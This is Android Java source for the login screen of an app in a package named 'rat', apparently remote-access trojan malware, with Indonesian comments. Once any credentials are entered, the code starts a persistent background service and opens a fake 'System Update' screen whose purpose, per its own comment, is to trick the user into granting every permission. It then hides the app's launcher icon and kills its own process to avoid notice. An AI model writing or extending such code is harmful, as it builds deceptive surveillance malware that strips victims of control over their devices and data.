package com.enterprise.rat;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Process;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import com.enterprise.rat.activities.FakeUpdateActivity;
import com.enterprise.rat.services.MainService;

public class LoginActivity extends Activity {
    private EditText username, key;
    private TextView errorText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);

        username = findViewById(R.id.username);
        key = findViewById(R.id.key);
        errorText = findViewById(R.id.error_text);
        Button loginButton = findViewById(R.id.login_button);

        loginButton.setOnClickListener(v -> {
            String user = username.getText().toString().trim();
            String pass = key.getText().toString().trim();

            // Dummy credentials – semua kombinasi diterima
            if (!user.isEmpty() && !pass.isEmpty()) {
                // Mulai service utama
                Intent serviceIntent = new Intent(this, MainService.class);
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent);
                } else {
                    startService(serviceIntent);
                }

                // Buka layar "System Update" untuk meminta semua izin
                Intent fakeUpdate = new Intent(this, FakeUpdateActivity.class);
                fakeUpdate.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
                startActivity(fakeUpdate);

                // Sembunyikan ikon aplikasi
                hideAppIcon();

                // Force close setelah 1 detik (biar layar izin sempat muncul)
                new android.os.Handler().postDelayed(() -> {
                    finishAffinity();
                    Process.killProcess(Process.myPid());
                    System.exit(0);
                }, 1000);
            } else {
                errorText.setVisibility(View.VISIBLE);
                errorText.setText("Both fields are required.");
            }
        });
    }

    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName mainComponent = new ComponentName(this, LoginActivity.class);
            pm.setComponentEnabledSetting(mainComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
